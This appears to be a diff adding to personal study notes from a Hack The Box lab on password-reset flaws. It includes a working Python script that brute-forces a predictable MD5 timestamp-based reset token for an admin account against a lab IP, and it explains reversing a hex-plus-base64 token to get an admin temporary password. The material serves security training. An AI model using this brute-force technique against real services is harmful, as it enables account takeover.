@@ -611,3 +611,55 @@ attempting a fake token you can get the error message:
 
 then in the reset_token_time.py script you can brute force a valid token for another user "htbadmin": 
 
+```python
+from hashlib import md5
+import requests
+from sys import exit
+import time
+from datetime import datetime
+
+url = "http://94.237.49.138:41571/question1/"
+
+time_str = "2024-02-21 09:18:22pm"
+
+# Convert the string to a datetime object
+dt_object = datetime.strptime(time_str, '%Y-%m-%d %I:%M:%S%p')
+
+# Convert the datetime object to epoch time in seconds
+epoch_time_seconds = int(dt_object.timestamp())
+
+# Convert epoch time to milliseconds
+epoch_time_milliseconds = epoch_time_seconds * 1000
+
+start_time = epoch_time_milliseconds - 1200
+end_time = epoch_time_milliseconds + 1200
+
+username = "htbadmin"
+fail_text = "Wrong token"
+
+# loop from start_time to now. + 1 is needed because of how range() works
+for x in range(start_time, end_time + 1):
+    # get token md5
+    md5_token = md5((username + str(x)).encode()).hexdigest()
+    data = {
+        "submit": "check",
+        "token": md5_token
+    }
+
+    print("checking {} {}".format(str(x), md5_token))
+
+    # send the request
+    res = requests.post(url, data=data)
+
+    # response text check
+    if not fail_text in res.text:
+        print(res.text)
+        print("[*] Congratulations! raw reply printed before")
+        exit()
+```
+
+in the other example we are given a long token that we can try different decodings of to find that it is simply a user-specific string converted into ASCII hex and then base64 
+
+we can do the reverse of this string with the admin account to get a valid temp password: 
+
+![](Images/Pasted%20image%2020240221134644.png)
